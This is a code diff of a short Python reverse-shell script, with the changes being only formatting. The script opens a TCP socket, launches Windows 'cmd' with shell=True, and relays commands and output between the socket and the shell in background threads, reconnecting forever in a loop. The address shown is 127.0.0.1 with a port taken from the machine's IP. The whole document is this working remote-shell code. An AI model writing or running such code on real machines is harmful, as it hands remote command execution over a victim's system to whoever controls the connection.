@@ -1,4 +1,4 @@
-import socket,subprocess,threading,time
+import socket, subprocess, threading, time ,os
 
 def s2p(s, p):
     while True:
@@ -7,9 +7,11 @@ def s2p(s, p):
             p.stdin.write(data)
             p.stdin.flush()
 
+
 def p2s(s, p):
     while True:
         s.send(p.stdout.read(1))
+
 
 def wait_for_message(ip, port):
     # Create a socket object
@@ -34,21 +36,28 @@ def wait_for_message(ip, port):
     client_socket.close()
     server_socket.close()
 
+
 def main():
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     self_ip = socket.gethostbyname(socket.gethostname())
-    port = int(socket.gethostbyname(socket.gethostname()).split('.')[-1])
-    
+    port = int(socket.gethostbyname(socket.gethostname()).split(".")[-1])
+
     ip = "127.0.0.1"
 
     wait_for_message(self_ip, port)
 
     time.sleep(2)
 
-    s.connect((ip,port)) # Fix
+    s.connect((ip, port))  # Fix
 
-    p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE , shell=True)
+    p = subprocess.Popen(
+        ["cmd"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        stdin=subprocess.PIPE,
+        shell=True,
+    )
 
     s2p_thread = threading.Thread(target=s2p, args=[s, p])
     s2p_thread.daemon = True
@@ -63,6 +72,7 @@ def main():
     except KeyboardInterrupt:
         s.close()
 
+
 while True:
-    main() 
+    main()
 # main()
